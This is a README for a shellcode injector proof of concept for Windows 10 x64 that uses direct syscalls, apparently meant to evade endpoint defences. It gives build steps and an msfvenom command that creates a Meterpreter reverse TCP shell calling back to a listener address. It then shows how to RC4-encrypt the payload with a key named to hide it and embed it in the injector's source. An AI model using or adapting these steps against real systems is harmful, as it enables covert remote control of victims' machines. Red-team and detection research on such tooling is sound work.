# AutoSyscall

The code for the shellcode injector from my blog post.

This code is a PoC and will probably only run of windows 10 x64 version 1909, this is because of the syscall numbers changing between versions. To fix, change the syscall number of line 16 in `syscalls.asm` with the corresponding number for that windows version. They can be found [here](https://j00ru.vexillium.org/syscalls/nt/64/).

## Install & Build

```
git clone https://github.com/bats3c/DefensiveInjector
cd DefensiveInjector
make
```

## Using different shellcode

- ##### Generate your shellcode either with msfvenom or something else
    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin`

- ##### Encrypt the shellcode
    Keeping in mind that if you change it here you will need to update the key on line 132 in `main.c`
    `cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin`

- ##### Format the shellcode
    Run `xxd -i encmeter.bin` then replace everything between line 10-60 with the output

## Dependencies
